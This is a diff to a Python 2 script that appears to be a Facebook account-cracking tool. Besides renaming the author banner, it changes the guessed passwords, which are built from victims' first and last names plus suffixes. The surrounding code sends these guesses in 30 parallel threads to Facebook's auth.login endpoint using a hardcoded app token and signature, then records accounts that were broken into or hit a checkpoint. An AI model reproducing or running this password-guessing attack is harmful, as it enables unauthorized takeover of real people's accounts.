@@ -371,7 +371,7 @@ def pilih_super():
 	print
 	print('\x1b[1;96m[!] \033[1;92mStop CTRL+z')
 	time.sleep(0.05)
-	print "\033[1;96m•◈•───────────────•◈•\033[1;92mFATIMA*ALI\033[1;96m•◈•───────────────•◈•"
+	print "\033[1;96m•◈•───────────────•◈•\033[1;92mASIF_SAID\033[1;96m•◈•───────────────•◈•"
 	print ('\033[1;96m[\033[1;92mO\033[1;93mR\033[1;96m]  \033[1;93m    User ID    \033[1;96m| \033[1;93mPassword \033[1;96m  - \033[1;93m ID Name')
 			
 	def main(arg):
@@ -412,7 +412,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name']+'1234'
+							pass3 = b['first_name']+'@#$&'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -426,7 +426,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = b['last_name']+'1234'
+									pass4 = b['last_name']+'1234@#$&'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -556,7 +556,7 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;96m•◈•───────────────•◈•\033[1;92mFATIMA*ALI\033[1;96m•◈•───────────────•◈•"
+	print "\033[1;96m•◈•───────────────•◈•\033[1;92mASIF_SAID\033[1;96m•◈•───────────────•◈•"
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Complete \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
